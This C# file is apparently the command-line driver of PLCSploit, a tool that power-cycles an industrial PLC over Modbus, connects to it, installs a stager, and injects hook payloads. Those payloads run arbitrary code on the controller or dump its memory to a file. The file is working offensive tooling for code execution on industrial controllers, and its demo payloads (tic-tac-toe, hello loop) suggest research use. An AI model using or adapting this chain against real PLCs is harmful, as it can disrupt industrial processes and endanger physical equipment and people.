using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using CommandLine;
using CommandLine.Text;
using PLCSploit.Core;

namespace PLCSploit.Cli
{
    class Program
    {
        public class Options
        {
            [Option('P', "port", Required = true, HelpText = "Local port that socat is listening to.")]
            public int Port { get; set; }

            [Option("switch-power", Default = true, HelpText = "Switch the power adapter on and off.")]
            public bool SwitchPower { get; set; }

            [Option("powersupply-host", Default = "192.168.1.18", HelpText = "Host of powersupply.")]
            public string PowerSupplyHost { get; set; }

            [Option("powersupply-port", Default = 502, HelpText = "Port of powersupply (Modbus TCP default is 502).")]
            public int PowerSupplyPort { get; set; }

            [Option("powersupply-delay", Default = 1, HelpText = "Number of seconds to wait before turning on power supply.")]
            public int PowerSupplyDelay { get; set; }

            [Option('s', "stager", Default = "stager/stager.bin", HelpText = "The location of the stager payload.")]
            public string Stager { get; set; }

            [Option('c', "continue", Default = false, HelpText = "Continue PLC execution after action completed.")]
            public bool Continue { get; set; }
        }

        [Verb("invoke", HelpText = "Invoke a hook.")]
        public class InvokeOptions : Options
        {
            [Option('p', "payload", Required = true, HelpText = "The file containing the payload to be executed.")]
            public string Payload { get; set; }

            [Option('a', "args", HelpText = "Additional arguments to be passed to payload invocation.")]
            public IEnumerable<string> Args { get; set; }
        }

        [Verb("dump", HelpText = "Dump memory.")]
        public class DumpOptions : Options
        {
            [Option('a', "address", Required = true, HelpText = "Address to dump at.")]
            public uint Address { get; set; }

            [Option('l', "length", Required = true, HelpText = "Number of bytes to dump.")]
            public uint Length { get; set; }

            [Option('d', "dump-payload", Default = "payloads/dump_mem/build/dump_mem.bin", HelpText = "Name of the payload file for dumping memory.")]
            public string Payload { get; set; }

            [Option('o', "out-file", HelpText = "Name of file to store the dump at.")]
            public string OutFile { get; set; }
        }

        [Verb("test", HelpText = "Run a test payload.")]
        public class TestOptions : Options
        {
            [Option('p', "payload", Default = "payloads/hello_world/hello_world.bin", HelpText = "The file containing the payload to be executed.")]
            public string Payload { get; set; }
        }

        [Verb("tictactoe", HelpText = "Run the tic-tac-toe payload.")]
        public class TicTacToeOptions : Options
        {
            [Option('p', "payload", Default = "payloads/tic_tac_toe/build/tic_tac_toe.bin", HelpText = "The file containing the payload to be executed.")]
            public string Payload { get; set; }
        }

        [Verb("hello_loop", HelpText = "Run the hello_loop payload.")]
        public class HelloLoopOptions : Options
        {
            [Option('p', "payload", Default = "payloads/hello_loop/build/hello_loop.bin", HelpText = "The file containing the payload to be executed.")]
            public string Payload { get; set; }
        }

        static void Main(string[] args)
        {
            var parser = new Parser(with => with.HelpWriter = null);
            var parserResult = parser.ParseArguments<TestOptions, DumpOptions, TicTacToeOptions, HelloLoopOptions, InvokeOptions>(args);
            parserResult
                .WithParsed<Options>(Run)
                .WithNotParsed(errs => HandleParseError(parserResult, errs));
        }

        static void Run(Options opts)
        {
            if (opts.SwitchPower)
            {
                var powerSupply = new PowerSupply(opts.PowerSupplyHost, opts.PowerSupplyPort, (msg, cat) => Console.WriteLine(msg));
                powerSupply.TurnOff();
                Console.WriteLine($"[+] Turned off power supply, sleeping for {opts.PowerSupplyDelay} seconds");
                Thread.Sleep(opts.PowerSupplyDelay * 1000);
                powerSupply.TurnOn();
                Console.WriteLine("[+] Successfully turned on power supply");
            }

            var client = new PLCClient((msg, cat) => Console.WriteLine(msg));
            client.Connect("localhost", opts.Port);

            if (!client.IsConnected)
            {
                Console.WriteLine("Failed to connect to PLC.");
                return;
            }

            if (client.Handshake())
            {
                HandleConnection(client, opts);
            }

            Console.WriteLine("Done.");
            client.Disconnect();
        }


        static void HandleConnection(PLCClient client, Options opts)
        {
            client.GetVersion();

            var stager = File.ReadAllBytes(opts.Stager);
            client.InstallStager(stager);

            byte[] payload = null;
            if (opts is TestOptions testOpts) payload = File.ReadAllBytes(testOpts.Payload);
            else if (opts is DumpOptions dumpOpts) payload = File.ReadAllBytes(dumpOpts.Payload);
            else if (opts is TicTacToeOptions tttOpts) payload = File.ReadAllBytes(tttOpts.Payload);
            else if (opts is HelloLoopOptions hlOpts) payload = File.ReadAllBytes(hlOpts.Payload);
            else if (opts is InvokeOptions invOpts) payload = File.ReadAllBytes(invOpts.Payload);

            if (payload == null)
            {
                Console.WriteLine("Unknown action");
                return;
            }

            var hook_ind = client.InstallAddHookViaStager(client.next_payload_location, payload);

            if (opts is TestOptions)
            {
                var answ = client.InvokeAddHook(hook_ind, new byte[0]);
                Console.WriteLine($"Got answer: {Encoding.ASCII.GetString(answ)}");
            }
            else if (opts is DumpOptions dumpOpts)
            {
                var contents = client.PayloadDumpMem(dumpOpts.Address, dumpOpts.Length, hook_ind);
                string out_filename = dumpOpts.OutFile ?? $"mem_dump_{dumpOpts.Address:x8}_{dumpOpts.Address + dumpOpts.Length:x8}";
                File.WriteAllBytes(out_filename, contents);
                Console.WriteLine($"Wrote data out to {out_filename}");
            }
            else if (opts is TicTacToeOptions)
            {
                client.InvokeAddHook(hook_ind, new byte[0], false);
                string msg = "";
                string END_TOKEN = "==>";
                while (!msg.Contains(END_TOKEN))
                {
                    var answ = client.RecvPacket();
                    msg = Encoding.ASCII.GetString(answ);
                    Console.Write(msg);
                    if (msg.Contains("enter a number"))
                    {
                        var choice = Console.ReadLine();
                        client.SendPacket(Encoding.ASCII.GetBytes(choice));
                    }
                }
            }
            else if (opts is HelloLoopOptions)
            {
                client.InvokeAddHook(hook_ind, new byte[0], false);
                while (true)
                {
                    var answ = client.RecvPacket();
                    if (answ == null) break;
                    Console.WriteLine($"Got packet: {Encoding.ASCII.GetString(answ)}");
                }
            }
            else if (opts is InvokeOptions invOpts)
            {
                var args = string.Join(" ", invOpts.Args);
                var answ = client.InvokeAddHook(hook_ind, Encoding.ASCII.GetBytes(args));
                Console.WriteLine($"Got answer: {Encoding.ASCII.GetString(answ)}");
            }
        }

        static void HandleParseError(ParserResult<object> result, IEnumerable<Error> errs)
        {
            var helpText = CommandLine.Text.HelpText.AutoBuild(result, h =>
            {
                h.AdditionalNewLineAfterOption = false;
                h.Heading = "PLCSploit";
                h.Copyright = "";
                return h;
            }, e => e);
            Console.WriteLine(helpText);
        }
    }
}
